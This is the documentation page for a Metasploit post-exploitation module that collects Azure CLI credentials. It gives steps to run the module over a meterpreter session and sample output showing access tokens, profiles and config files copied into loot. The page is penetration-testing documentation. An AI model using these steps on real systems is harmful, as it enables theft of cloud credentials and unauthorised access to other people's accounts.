## Vulnerable Application

  Any windows or linux system with a `meterpreter` session and [Azure CLI 2.0](https://docs.microsoft.com/en-us/cli/azure/?view=azure-cli-latest).

  Successfully tested on:

  * Azure CLI 2.0.33 on Windows Server 2012 R2
  * azure-cli 2.0.33-1.el7 on openSUSE Tumbleweed 20180517

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install Azure CLI
  2. Start msfconsole
  3. Get a `meterpreter` session on some host.
  4. Do: ```use post/multi/gather/azure_cli_creds```
  5. Do: ```set SESSION [SESSION_ID]```
  6. Do: ```run```
  7. If the system has readable configuration files for Azure CLI, they will stored in loot and a summary will be printed to the screen.

## Options

  None.

## Scenarios

   ```
msf5 post(multi/gather/azure_cli_creds) > run

[+] /home/james/.azure/accessTokens.json stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.jwt_tok_029844.txt
[+] /home/james/.azure/azureProfile.json stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.azure_p_897386.txt
[+] /home/james/.azure/config stored to /home/james/.msf4/loot/20180528233056_default_192.168.1.49_azurecli.config_976372.txt
Subscriptions
=============

Source                                Account Name              Username                  Cloud Name
------                                ------------              --------                  ----------
/home/james/.azure/azureProfile.json  Some Azure Account Name   example.user@example.com  AzureCloud
/home/james/.azure/azureProfile.json  Some Azure Account Name2  example.user@example.com  AzureCloud


Tokens
======

Source                                Username                  Count
------                                --------                  -----
/home/james/.azure/accessTokens.json  example.user@example.com  2

[*] Post module execution completed

   ```
